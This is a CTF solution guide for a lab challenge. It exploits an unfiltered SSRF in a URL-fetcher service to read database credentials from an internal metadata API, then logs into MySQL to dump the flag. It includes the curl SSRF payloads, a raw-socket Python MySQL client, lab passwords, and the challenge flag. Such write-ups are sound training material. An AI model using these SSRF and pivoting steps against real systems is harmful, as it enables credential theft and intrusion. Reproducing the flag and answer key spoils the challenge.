# Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF)
## Official Complete Solution & Exploitation Guide

---

### 📋 Challenge Summary

| Field | Detail |
| :--- | :--- |
| **Stage Number** | Stage 8 (Capstone Operation) |
| **Challenge Name** | Core Infrastructure Breach |
| **Domain** | Network Pivoting & Cloud Metadata SSRF |
| **Difficulty** | Hard |
| **Points / Bounty** | 500 XP |
| **Delivery Method** | Hardware-Accelerated Ubuntu Virtual Machine (QEMU/KVM, Zero Docker) |
| **Interactive Terminal** | In-Browser PwnBox Terminal (`http://localhost:7681`) or Direct SSH (port `2228`) |
| **Official Flag** | `SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}` |

---

### 🏗️ Network Architecture & Infiltration Topology

```text
 ┌────────────────────────────────────────────────────────────────────────┐
 │                      ATTACKER WORKSPACE / PWNBOX                       │
 │                                                                        │
 │   • In-Browser Terminal: http://localhost:7681                         │
 │   • Direct Host SSH:     ssh -p 2228 shadownet@localhost               │
 │   • External Kali VM:    ssh -p 2228 shadownet@<HOST_IP>               │
 └───────────────────────────────────┬────────────────────────────────────┘
                                     │
                                     │ QEMU User-Mode Port Forwards:
                                     │   • Host 2228 -> VM 22 (SSH)
                                     │   • Host 3008 -> VM 3000 (HTTP Entry)
                                     │   • Host 7681 -> Host Terminal Server
                                     ▼
 ┌────────────────────────────────────────────────────────────────────────┐
 │                   UBUNTU VIRTUAL MACHINE (QEMU / KVM)                  │
 │                      Hostname: shadownet-stage8-vm                     │
 │                      User: shadownet (Pass: password123)               │
 │                                                                        │
 │   [PERIMETER ENTRY HOST]                                               │
 │   • Service: Python HTTP / Flask URL Fetcher                           │
 │   • Bind: 0.0.0.0:3000 (Mapped externally to http://localhost:3008)   │
 │   • Vulnerability: Unrestricted SSRF on GET /fetch?url=...             │
 │                                                                        │
 │   ──────────────────────────────────────────────────────────────────   │
 │   [ISOLATED INTERNAL SUBNET: 192.168.100.0/24]                         │
 │   • Internal Gateway / Target Host: 192.168.100.10                     │
 │                                                                        │
 │   1. Cloud Metadata API (Port 8080)                                    │
 │      • Endpoint: /metadata/db-credentials                              │
 │      • Endpoint: /metadata/all                                         │
 │      • Firewall: Drops all external ingress; accepts loopback/internal │
 │                                                                        │
 │   2. Internal Core MySQL Database (Port 3306)                          │
 │      • Database: nexacorp                                              │
 │      • User: db_user / Password: SecurePass123                         │
 │      • Target Table: flags -> Column: flag                             │
 └────────────────────────────────────────────────────────────────────────┘
```

---

### 🚀 Step 0: Starting the Virtual Machine Environment

Before beginning exploitation, launch the virtual machine cluster on your host machine:

```bash
# Start the virtual machine in headless server mode (Recommended)
./stages/stage8-network/start_stage8_vm.sh --vm

# Alternatively, start with a visible graphical desktop window (GTK)
./stages/stage8-network/start_stage8_vm.sh --vm --gui
```

Once launched, you will see the active service confirmation:
- **In-Browser Terminal:** `http://localhost:7681`
- **Entry Host Gateway:** `http://localhost:3008`
- **VM SSH Port:** `2228` (User: `shadownet` / Password: `password123`)

---

### 💻 Connecting to the Attacker Console

Choose one of three connection methods:

#### Method A: In-Browser PwnBox Terminal (TryHackMe / HTB Style)
Open your web browser and navigate to:
```text
http://localhost:7681
```
This spawns a full interactive bash terminal directly inside the Ubuntu virtual machine (`shadownet@shadownet-stage8-vm`). The shell strictly exposes only challenge files in `/home/shadownet`—host filesystem files are completely isolated.

#### Method B: Direct Local Host SSH
Open a terminal on your host machine and run:
```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2228 shadownet@localhost
```
When prompted for the password, enter:
```text
password123
```
*(Or run the included one-click helper script: `./stages/stage8-network/ssh_vm.sh`)*

#### Method C: Attacker Access from an External Kali Linux VM
If you are running Kali Linux in VirtualBox, VMware, or over your local area network (LAN):
1. Find your host system's IP address by running `hostname -I` or `ip -4 addr show` on the host (e.g., `192.168.8.127` or VirtualBox Host-Only `192.168.56.1`).
2. From your Kali Linux terminal, connect via:
   ```bash
   ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2228 shadownet@192.168.8.127
   ```
   Password: `password123`

---

### 🔍 Step 1: Reconnaissance & Entry Host Discovery

1. Inside your attacker terminal (or via your browser), inspect the challenge directory:
   ```bash
   cd ~/challenge
   ls -la
   cat ~/README.txt
   cat ~/network_info.txt
   ```

2. Probe the perimeter web service running on port `3000` (accessible from host on port `3008`):
   ```bash
   curl -i http://localhost:3000/
   ```
   **Response:**
   ```html
   HTTP/1.0 200 OK
   Content-Type: text/html; charset=utf-8

   <!DOCTYPE html>
   <html>
   <head>
       <title>NexaCorp - URL Fetcher Service</title>
   ...
       <form id="fetchForm">
           <label>URL to fetch:</label><br>
           <input type="text" id="urlInput" placeholder="http://192.168.100.10:8080/metadata/db-credentials" required><br>
           <button type="submit">Execute Request</button>
       </form>
   ```

3. Notice the input parameter: The service provides a utility designed for internal subsystem testing that takes a `url` parameter and queries it on behalf of the server.

---

### ⚡ Step 2: Testing & Validating the SSRF Vulnerability

Test the `/fetch` endpoint by submitting an external or internal test request:

```bash
curl -s "http://localhost:3000/fetch?url=http://example.com"
```

**Response:**
```json
{
  "url": "http://example.com",
  "status": 200,
  "content": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>..."
}
```

The application accepts arbitrary HTTP URLs without any link-local or private IP filtering (RFC 1918 / loopback protection). This is a textbook **Server-Side Request Forgery (SSRF)** vulnerability.

---

### 🕵️ Step 3: Pivoting Across the Internal Subnet via SSRF

From `network_info.txt`, the internal infrastructure resides on the isolated subnet `192.168.100.0/24`:
- Target Host: `192.168.100.10`
- Internal Cloud Metadata API: Port `8080`
- Internal MySQL Database: Port `3306`

#### 1. Probe the Metadata Service via SSRF
```bash
curl -s "http://localhost:3000/fetch?url=http://192.168.100.10:8080/metadata/db-credentials"
```

**JSON Output:**
```json
{
  "url": "http://192.168.100.10:8080/metadata/db-credentials",
  "status": 200,
  "content": "{\"host\": \"192.168.100.10\", \"port\": 3306, \"username\": \"db_user\", \"password\": \"SecurePass123\", \"database\": \"nexacorp\"}"
}
```

#### 2. Query All Cloud Metadata for Additional Intelligence
```bash
curl -s "http://localhost:3000/fetch?url=http://192.168.100.10:8080/metadata/all"
```

**JSON Output:**
```json
{
  "url": "http://192.168.100.10:8080/metadata/all",
  "status": 200,
  "content": "{\"database\": {\"host\": \"192.168.100.10\", \"port\": 3306, \"username\": \"db_user\", \"password\": \"SecurePass123\", \"database\": \"nexacorp\"}, \"credentials\": {\"api_key\": \"sk-1234567890abcdef\", \"secret\": \"secret-key-for-internal-api\"}}"
}
```

#### 3. Recovered Database Credentials
From the exfiltrated metadata:
- **Host:** `192.168.100.10`
- **Port:** `3306` (MySQL)
- **Database:** `nexacorp`
- **Username:** `db_user`
- **Password:** `SecurePass123`

---

### 🔓 Step 4: Connecting to Internal Database & Dumping the Flag

Using the compromised credentials, pivot directly into the internal MySQL database from within your VM shell:

#### Method 1: Using the MySQL Command-Line Client
```bash
mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp
```

Inside the MySQL prompt:
```sql
SHOW TABLES;
-- Result: flags

SELECT * FROM flags;
```

Or execute as a one-liner:
```bash
mysql -h 192.168.100.10 -u db_user -pSecurePass123 -D nexacorp -e "SELECT flag FROM flags WHERE challenge='final_breach';"
```

#### Method 2: Using Pure Python (Zero Dependencies)
If the MySQL client is not locally available, execute this Python snippet inside your shell:

```bash
python3 -c "
import socket, struct, re

s = socket.create_connection(('192.168.100.10', 3306))
s.recv(1024) # handshake

# Send handshake response (db_user)
user = b'db_user\x00'
payload = struct.pack('<I', 0x80000000 | 0x0200) + struct.pack('<I', 1024*1024) + b'\x21' + b'\x00'*23 + user
s.sendall(struct.pack('<I', len(payload) | (1 << 24)) + payload)
s.recv(1024) # OK

# Query flags table
query = b'\x03SELECT flag FROM flags'
s.sendall(struct.pack('<I', len(query) | (0 << 24)) + query)

data = b''
s.settimeout(1.0)
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
except Exception: pass

flags = re.findall(rb'SHADOWNET\{[^}]+\}', data)
for f in flags:
    print('[+] Flag Found:', f.decode())
s.close()
"
```

---

### 🚩 Step 5: Final Flag Capture & Verification

**Extracted Capstone Flag:**
```text
SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}
```

#### Automated One-Click Verification
You can also run the automated solve script from the host project:
```bash
python3 stages/stage8-network/solve.py
```

**Verification Output:**
```text
[*] Stage 8: Core Infrastructure Breach (Network Pivoting & SSRF)
[+] Located Entry Host on: http://localhost:3008

[*] Step 2: Exploiting SSRF parameter via /fetch...
[*] Querying: http://localhost:3008/fetch?url=http%3A//192.168.100.10%3A8080/metadata/db-credentials
[+] SSRF Response Status: 200
[*] Exfiltrated Metadata Payload:
{"host": "192.168.100.10", "port": 3306, "username": "db_user", "password": "SecurePass123", "database": "nexacorp"}

[+] Extracted Database Credentials:
    • Host:     192.168.100.10
    • Database: nexacorp
    • Username: db_user
    • Password: SecurePass123

[★] RETRIEVED CAPSTONE FLAG:
    SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}
```

Submit `SHADOWNET{9j_3r4_3xnl3_fl4g_JI**&H_b#4gjB^$_gh%}` on the CTF dashboard:
```text
https://shadownet-ctf.vercel.app/dashboard/challenges/8
```
This completes Stage 8 and awards **500 XP**.

---

### 🛑 Step 6: Shutting Down the VM Environment

When you have finished the challenge, shut down the QEMU virtual machine and free up ports (`2228`, `3008`, `7681`) by running:

```bash
./stages/stage8-network/stop_stage8_vm.sh
```

---

### 🛠️ Common Troubleshooting

| Issue | Cause | Fix |
| :--- | :--- | :--- |
| `REMOTE HOST IDENTIFICATION HAS CHANGED` | Stale SSH host key fingerprint in `~/.ssh/known_hosts` | Run `ssh-keygen -R "[localhost]:2228"` or connect with `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` |
| `Port 3000 shows Next.js dashboard instead of URL fetcher` | Host machine Next.js dev server occupies port 3000 | Connect to the mapped external port: `http://localhost:3008/` |
| `Connection refused on port 2228 or 7681` | VM is still initializing or stopped | Run `./stages/stage8-network/start_stage8_vm.sh --vm` and wait 5–8 seconds for boot |
| `Cannot connect from Kali Linux VM` | Incorrect IP address used | Check host IP via `hostname -I` and ensure bridge/host-only network is active between VMs |
